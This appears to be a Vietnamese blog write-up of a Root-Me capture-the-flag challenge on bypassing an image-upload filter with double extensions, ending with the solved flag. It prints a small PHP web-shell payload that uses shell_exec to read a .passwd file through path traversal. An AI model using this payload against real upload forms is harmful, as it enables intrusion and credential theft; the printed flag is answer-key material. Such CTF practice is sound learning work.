---
template: overrides/blog.html
icon: material/plus-circle
title: File upload - Double extensions
description: >
  
search:
  exclude: true
hide:
  - feedback

tags:
    - PHP
    - Path Traversal
---

# __File upload - Double extensions__

<span>
:octicons-calendar-24: May 09, 2023

</span>

---


## __Tài nguyên và link challenge__

Tài nguyên của challenge này tại [https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions](https://www.root-me.org/en/Challenges/Web-Server/File-upload-Double-extensions)

Link challenge này tại [:octicons-arrow-right-24: http://challenge01.root-me.org/web-serveur/ch20/][http://challenge01.root-me.org/web-serveur/ch20/]

  [http://challenge01.root-me.org/web-serveur/ch20/]: http://challenge01.root-me.org/web-serveur/ch20/

## __Tổng quan__

Trong challenge này, mục tiêu của ta là hack thư viện ảnh bằng cách tải liên đoạn mã php. Lấy mật khẩu trong tệp .passwd

## __Kịch bản tấn công__

Challenge này cung cấp cho chúng ta một website có chức năng upload ảnh. Hơn nữa, lại còn cho ta biết có file .passwd tồn tại trong website. Ta thử LFI vào file xem sao

<figure markdown>
  ![Image title](/rootme/web-server/php/images/file-upload_double_extensions-01.png#zoom)
  <figcaption>Hình ảnh website</figcaption>
</figure>

Ta không thể truy cập được file. Bây giờ, ta sẽ tiêm code php vào và nhận được password

<figure markdown>
  ![Image title](/rootme/web-server/php/images/file-upload_double_extensions-02.png#zoom)
  <figcaption>Hình ảnh website</figcaption>
</figure>

Với đoạn code cần tiêm là

<div class="result" markdown>

``` php linenums="1"
<?php
$output = shell_exec('cat ../../../.passwd');
echo "<pre>$output</pre>";
?>
```

</div>

!!! success "__Flag__"
    Gg9LRz-hWSxqqUKd77-_q-6G8
